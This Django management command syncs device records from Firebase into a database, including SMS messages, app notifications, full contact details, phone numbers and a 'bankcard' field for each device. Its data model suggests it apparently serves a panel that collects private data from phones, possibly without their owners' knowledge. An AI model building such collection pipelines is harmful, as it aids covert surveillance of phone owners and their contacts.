"""
Iterate over Firebase device/{device_id}, find-or-create each Device in Django,
then add all messages, notifications, and contacts one by one.

Flow:
  1. List all device IDs from Firebase path "device/" (or "fastpay/testing/", "fastpay/running/").
  2. For each device_id:
     a. Fetch device info from device/{device_id} (or legacy paths).
     b. Find or create Device in Django.
     c. Fetch messages from message/{device_id} (or legacy); add each Message one by one.
     d. Fetch notifications from device/{device_id}/Notification (or legacy); add each one by one.
     e. Fetch contacts from device/{device_id}/Contact (or legacy); add each one by one.

Usage:
  python manage.py sync_device_from_firebase
  python manage.py sync_device_from_firebase --device-id=ABC123
  python manage.py sync_device_from_firebase --source=device
  python manage.py sync_device_from_firebase --source=fastpay/testing --limit 5
  python manage.py sync_device_from_firebase --dry-run
"""
import logging
import os

from django.core.management.base import BaseCommand, CommandError
from django.utils import timezone

logger = logging.getLogger(__name__)

try:
    import firebase_admin
    from firebase_admin import credentials, db
    FIREBASE_AVAILABLE = True
except ImportError:
    FIREBASE_AVAILABLE = False


class Command(BaseCommand):
    help = "Iterate device/device_id from Firebase; find-or-create Device; add messages, notifications, contacts one by one"

    def add_arguments(self, parser):
        parser.add_argument(
            "--device-id",
            type=str,
            help="Sync only this device ID (otherwise iterate all under source path)",
        )
        parser.add_argument(
            "--source",
            type=str,
            default="device",
            choices=["device", "fastpay/testing", "fastpay/running"],
            help="Firebase path to list device IDs from (default: device)",
        )
        parser.add_argument(
            "--message-limit",
            type=int,
            default=500,
            help="Max messages to sync per device (default: 500)",
        )
        parser.add_argument(
            "--dry-run",
            action="store_true",
            help="Do not write to Django; only show what would be done",
        )
        parser.add_argument(
            "--limit",
            type=int,
            default=0,
            help="Max number of devices to process (0 = all)",
        )

    def handle(self, *args, **options):
        if not FIREBASE_AVAILABLE:
            raise CommandError("Firebase Admin SDK not installed. pip install firebase-admin")

        self._initialize_firebase()

        device_id_arg = options.get("device_id")
        source = options["source"]
        message_limit = options["message_limit"]
        dry_run = options["dry_run"]
        limit_devices = options["limit"]

        if device_id_arg:
            device_ids = [device_id_arg]
            self.stdout.write(f"Single device: {device_id_arg}\n")
        else:
            device_ids = self._list_device_ids(source)
            self.stdout.write(f"Found {len(device_ids)} device(s) under Firebase path '{source}'\n")
            if limit_devices > 0:
                device_ids = device_ids[:limit_devices]
                self.stdout.write(f"Processing first {limit_devices} devices\n")

        if not device_ids:
            self.stdout.write(self.style.WARNING("No devices to process."))
            return

        from api.models import Device, Message, Notification, Contact
        from api.utils.firebase import (
            get_firebase_device_info,
            get_firebase_messages_for_device,
            get_firebase_notifications_for_device,
            get_firebase_contacts_for_device,
        )
        from api.utils.helpers import get_all_admin_users

        total_devices = 0
        total_created = 0
        total_updated = 0
        total_messages = 0
        total_notifications = 0
        total_contacts = 0
        errors = []

        for i, device_id in enumerate(device_ids, 1):
            self.stdout.write(f"\n[{i}/{len(device_ids)}] device_id = {device_id}")

            # 1) Get device info from Firebase
            firebase_device_info = get_firebase_device_info(device_id)
            if not firebase_device_info:
                self.stdout.write(self.style.WARNING(f"  No data at device/{device_id}; skip."))
                continue

            if dry_run:
                self.stdout.write(f"  [dry-run] Would find_or_create Device, then add messages/notifications/contacts")
                total_devices += 1
                continue

            try:
                # 2) Find or create Device
                firebase_is_active = firebase_device_info.get("isActive", False)
                if isinstance(firebase_is_active, str):
                    is_active_bool = firebase_is_active.lower() in ("opened", "active", "true", "1", "yes")
                else:
                    is_active_bool = bool(firebase_is_active)

                defaults = {
                    "name": firebase_device_info.get("name") or firebase_device_info.get("deviceName"),
                    "model": firebase_device_info.get("model"),
                    "phone": firebase_device_info.get("phone"),
                    "code": firebase_device_info.get("code"),
                    "is_active": is_active_bool,
                    "last_seen": firebase_device_info.get("time") or firebase_device_info.get("lastSeen"),
                    "battery_percentage": firebase_device_info.get("batteryPercentage"),
                    "current_phone": firebase_device_info.get("currentPhone") or firebase_device_info.get("phone"),
                    "current_identifier": firebase_device_info.get("currentIdentifier"),
                    "time": firebase_device_info.get("time"),
                    "bankcard": firebase_device_info.get("bankcard", "BANKCARD"),
                    "system_info": firebase_device_info.get("systemInfo", {}),
                    "sync_status": "syncing",
                }
                device, created = Device.objects.get_or_create(device_id=device_id, defaults=defaults)
                if created:
                    total_created += 1
                    try:
                        admin_users = get_all_admin_users()
                        device.assigned_to.add(*admin_users)
                    except Exception:
                        pass
                    self.stdout.write(f"  Device created: {device_id}")
                else:
                    total_updated += 1
                    device.name = defaults["name"] or device.name
                    device.model = defaults["model"] or device.model
                    device.phone = defaults["phone"] or device.phone
                    device.code = defaults["code"] or device.code
                    device.is_active = is_active_bool
                    device.last_seen = defaults["last_seen"] or device.last_seen
                    device.battery_percentage = defaults["battery_percentage"] if firebase_device_info.get("batteryPercentage") is not None else device.battery_percentage
                    device.current_phone = defaults["current_phone"] or device.current_phone
                    device.current_identifier = defaults["current_identifier"] or device.current_identifier
                    device.time = defaults["time"] or device.time
                    device.bankcard = defaults["bankcard"] or device.bankcard
                    if firebase_device_info.get("systemInfo"):
                        cur = device.system_info or {}
                        cur.update(firebase_device_info.get("systemInfo", {}))
                        device.system_info = cur
                    device.sync_status = "syncing"
                    device.sync_error_message = None
                    device.save()
                    self.stdout.write(f"  Device updated: {device_id}")

                total_devices += 1

                # 3) Messages: fetch and add one by one
                messages_data = get_firebase_messages_for_device(device_id, limit=message_limit)
                msg_created = 0
                for timestamp_str, message_data in messages_data.items():
                    try:
                        timestamp = int(timestamp_str)
                        if isinstance(message_data, dict):
                            message_type = message_data.get("type", "received")
                            phone = message_data.get("phone", "")
                            body = message_data.get("body", "")
                            read = message_data.get("read", False)
                        elif isinstance(message_data, str):
                            parts = message_data.split("~", 2)
                            message_type = parts[0] if len(parts) > 0 else "received"
                            phone = parts[1] if len(parts) > 1 else ""
                            body = parts[2] if len(parts) > 2 else ""
                            read = False
                        else:
                            continue
                        if message_type not in ("received", "sent"):
                            message_type = "received"
                        _, created = Message.objects.get_or_create(
                            device=device,
                            timestamp=timestamp,
                            defaults={"message_type": message_type, "phone": phone, "body": body, "read": read},
                        )
                        if created:
                            msg_created += 1
                    except Exception as e:
                        errors.append(f"{device_id} message {timestamp_str}: {e}")
                total_messages += msg_created
                self.stdout.write(f"  Messages: +{msg_created} (fetched {len(messages_data)})")

                # 4) Notifications: fetch and add one by one
                notifications_data = get_firebase_notifications_for_device(device_id)
                notif_created = 0
                for timestamp_str, notification_data in notifications_data.items():
                    try:
                        timestamp = int(timestamp_str)
                        if isinstance(notification_data, dict):
                            package_name = notification_data.get("package", "") or notification_data.get("packageName", "")
                            title = notification_data.get("title", "")
                            text = notification_data.get("text", "") or notification_data.get("body", "")
                        elif isinstance(notification_data, str):
                            parts = notification_data.split("~", 2)
                            package_name = parts[0] if len(parts) > 0 else ""
                            title = parts[1] if len(parts) > 1 else ""
                            text = parts[2] if len(parts) > 2 else ""
                        else:
                            continue
                        if not package_name:
                            continue
                        _, created = Notification.objects.get_or_create(
                            device=device,
                            timestamp=timestamp,
                            defaults={"package_name": package_name, "title": title, "text": text},
                        )
                        if created:
                            notif_created += 1
                    except Exception as e:
                        errors.append(f"{device_id} notification {timestamp_str}: {e}")
                total_notifications += notif_created
                self.stdout.write(f"  Notifications: +{notif_created} (fetched {len(notifications_data)})")

                # 5) Contacts: fetch and add one by one
                contacts_data = get_firebase_contacts_for_device(device_id)
                contact_created = 0
                for phone_number, contact_data in contacts_data.items():
                    try:
                        if isinstance(contact_data, dict):
                            contact_id = contact_data.get("contactId") or contact_data.get("id", phone_number)
                            name = contact_data.get("name", "")
                            display_name = contact_data.get("displayName", "") or contact_data.get("display_name", "")
                            phones = contact_data.get("phones", [])
                            emails = contact_data.get("emails", [])
                            addresses = contact_data.get("addresses", [])
                            websites = contact_data.get("websites", [])
                            im_accounts = contact_data.get("imAccounts", []) or contact_data.get("im_accounts", [])
                            photo_uri = contact_data.get("photoUri", "") or contact_data.get("photo_uri", "")
                            thumbnail_uri = contact_data.get("thumbnailUri", "") or contact_data.get("thumbnail_uri", "")
                            company = contact_data.get("company", "")
                            job_title = contact_data.get("jobTitle", "") or contact_data.get("job_title", "")
                            department = contact_data.get("department", "")
                            birthday = contact_data.get("birthday", "")
                            anniversary = contact_data.get("anniversary", "")
                            notes = contact_data.get("notes", "")
                            last_contacted = contact_data.get("lastContacted", "") or contact_data.get("last_contacted", "")
                            times_contacted = contact_data.get("timesContacted", 0) or contact_data.get("times_contacted", 0)
                            is_starred = contact_data.get("isStarred", False) or contact_data.get("is_starred", False)
                            nickname = contact_data.get("nickname", "")
                            phonetic_name = contact_data.get("phoneticName", "") or contact_data.get("phonetic_name", "")
                        else:
                            contact_id = phone_number
                            name = display_name = photo_uri = thumbnail_uri = company = job_title = department = ""
                            birthday = anniversary = notes = nickname = phonetic_name = ""
                            phones = emails = addresses = websites = im_accounts = []
                            last_contacted = None
                            times_contacted = 0
                            is_starred = False
                        if isinstance(last_contacted, str) and last_contacted.isdigit():
                            last_contacted = int(last_contacted)
                        elif not isinstance(last_contacted, (int, type(None))):
                            last_contacted = None
                        _, created = Contact.objects.get_or_create(
                            device=device,
                            phone_number=phone_number,
                            defaults={
                                "contact_id": contact_id,
                                "name": name,
                                "display_name": display_name,
                                "phones": phones if isinstance(phones, list) else [],
                                "emails": emails if isinstance(emails, list) else [],
                                "addresses": addresses if isinstance(addresses, list) else [],
                                "websites": websites if isinstance(websites, list) else [],
                                "im_accounts": im_accounts if isinstance(im_accounts, list) else [],
                                "photo_uri": photo_uri or None,
                                "thumbnail_uri": thumbnail_uri or None,
                                "company": company,
                                "job_title": job_title,
                                "department": department,
                                "birthday": birthday,
                                "anniversary": anniversary,
                                "notes": notes,
                                "last_contacted": last_contacted,
                                "times_contacted": times_contacted or 0,
                                "is_starred": is_starred,
                                "nickname": nickname,
                                "phonetic_name": phonetic_name,
                            },
                        )
                        if created:
                            contact_created += 1
                    except Exception as e:
                        errors.append(f"{device_id} contact {phone_number}: {e}")
                total_contacts += contact_created
                self.stdout.write(f"  Contacts: +{contact_created} (fetched {len(contacts_data)})")

                # Mark device synced
                device.sync_status = "synced"
                device.sync_error_message = None
                device.last_sync_at = timezone.now()
                device.last_hard_sync_at = timezone.now()
                device.messages_last_synced_at = timezone.now()
                device.notifications_last_synced_at = timezone.now()
                device.contacts_last_synced_at = timezone.now()
                device.save()

            except Exception as e:
                errors.append(f"{device_id}: {e}")
                logger.exception("Sync device %s", device_id)
                self.stdout.write(self.style.ERROR(f"  Error: {e}"))

        # Summary
        self.stdout.write(self.style.HTTP_INFO(f"\n--- Summary ---"))
        self.stdout.write(f"Devices processed: {total_devices} (created: {total_created}, updated: {total_updated})")
        self.stdout.write(f"Messages created:  {total_messages}")
        self.stdout.write(f"Notifications created: {total_notifications}")
        self.stdout.write(f"Contacts created: {total_contacts}")
        if errors:
            self.stdout.write(self.style.ERROR(f"Errors: {len(errors)}"))
            for err in errors[:15]:
                self.stdout.write(self.style.ERROR(f"  {err}"))
            if len(errors) > 15:
                self.stdout.write(self.style.ERROR(f"  ... and {len(errors) - 15} more"))
        if dry_run:
            self.stdout.write(self.style.WARNING("\nDry run — no data written."))

    def _list_device_ids(self, source: str):
        """List device IDs under Firebase path (e.g. device, fastpay/testing, fastpay/running)."""
        try:
            ref = db.reference(source)
            data = ref.get()
            if not data or not isinstance(data, dict):
                return []
            return [k for k in data.keys() if isinstance(data.get(k), dict)]
        except Exception as e:
            logger.warning("List device IDs from %s: %s", source, e)
            return []

    def _initialize_firebase(self):
        import json
        try:
            firebase_admin.get_app()
            return
        except ValueError:
            pass
        url = os.environ.get("FIREBASE_DATABASE_URL")
        if not url:
            raise CommandError("FIREBASE_DATABASE_URL is required")
        json_str = os.environ.get("FIREBASE_CREDENTIALS_JSON")
        if json_str:
            try:
                cred = credentials.Certificate(json.loads(json_str))
            except Exception as e:
                raise CommandError(f"Invalid FIREBASE_CREDENTIALS_JSON: {e}") from e
            firebase_admin.initialize_app(cred, {"databaseURL": url})
            return
        path = os.environ.get("FIREBASE_CREDENTIALS_PATH")
        if path and os.path.exists(path):
            try:
                cred = credentials.Certificate(path)
            except PermissionError:
                with open(path) as f:
                    cred = credentials.Certificate(json.load(f))
            firebase_admin.initialize_app(cred, {"databaseURL": url})
            return
        try:
            firebase_admin.initialize_app(options={"databaseURL": url})
        except Exception as e:
            raise CommandError(f"Firebase init failed: {e}") from e
